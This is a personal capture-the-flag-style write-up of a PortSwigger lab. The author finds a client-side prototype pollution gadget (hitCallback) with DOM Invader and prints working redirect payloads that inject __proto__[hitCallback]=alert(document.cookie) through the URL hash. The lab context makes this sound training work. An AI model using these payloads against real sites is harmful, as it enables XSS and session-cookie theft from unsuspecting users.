# Practitioner Lab 151: Client-side prototype pollution in third-party libraries

---

This lab is vulnerable to DOM XSS via client-side prototype pollution. This is due to a gadget in a third-party library, which is easy to miss due to the minified source code. Although it's technically possible to solve this lab manually, we recommend using DOM Invader as this will save you a considerable amount of time and effort.

To solve the lab:

1. Use DOM Invader to identify a prototype pollution and a gadget for DOM XSS.
2. Use the provided exploit server to deliver a payload to the victim that calls `alert(document.cookie)` in their browser.

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out Widespread prototype pollution gadgets by Gareth Heyes.

I turned on DOM invader. 

I then played with the site to capture. 

![Untitled](Practitioner%20Lab%20151%20Client-side%20prototype%20polluti%20da9ca7d8ed204a4892402155a6e01563/Untitled.png)

I then started scanning 

![Untitled](Practitioner%20Lab%20151%20Client-side%20prototype%20polluti%20da9ca7d8ed204a4892402155a6e01563/Untitled%201.png)

This found a sink and a gadget to exploit. 

![Untitled](Practitioner%20Lab%20151%20Client-side%20prototype%20polluti%20da9ca7d8ed204a4892402155a6e01563/Untitled%202.png)

Using this I can see the value it has. 

Im targeting the hitCallback

![Untitled](Practitioner%20Lab%20151%20Client-side%20prototype%20polluti%20da9ca7d8ed204a4892402155a6e01563/Untitled%203.png)

![Untitled](Practitioner%20Lab%20151%20Client-side%20prototype%20polluti%20da9ca7d8ed204a4892402155a6e01563/Untitled%204.png)

![Untitled](Practitioner%20Lab%20151%20Client-side%20prototype%20polluti%20da9ca7d8ed204a4892402155a6e01563/Untitled%205.png)

It was injected into the hash 

so now I will try to test it. 

![Untitled](Practitioner%20Lab%20151%20Client-side%20prototype%20polluti%20da9ca7d8ed204a4892402155a6e01563/Untitled%206.png)

Here I can see I was able to manually inject it. 

![Untitled](Practitioner%20Lab%20151%20Client-side%20prototype%20polluti%20da9ca7d8ed204a4892402155a6e01563/Untitled%207.png)

```
<script>
location = "https://0a5500f003b33e1f813ed0b200bb00e5.web-security-academy.net/filter?category=Accessories#cat=13372&category=Accessories&__proto__[hitCallback]=alert%28document.cookie%29"
</script>
```

For some reason this is not solving the lab even if it is sending the client into the site and opening the alert box. I will try on another section of the page. 

```
<script>
location = "https://0a5500f003b33e1f813ed0b200bb00e5.web-security-academy.net/chat#__proto__[hitCallback]=alert%28document.cookie%29"
</script>

```

Lastly after using 

```
<script>
location.href = "https://0a5500f003b33e1f813ed0b200bb00e5.web-security-academy.net/chat#__proto__[hitCallback]=alert%28document.cookie%29"
</script>

```

This managed to work. 

I think the reason why it was not solving it is because the servers were slow.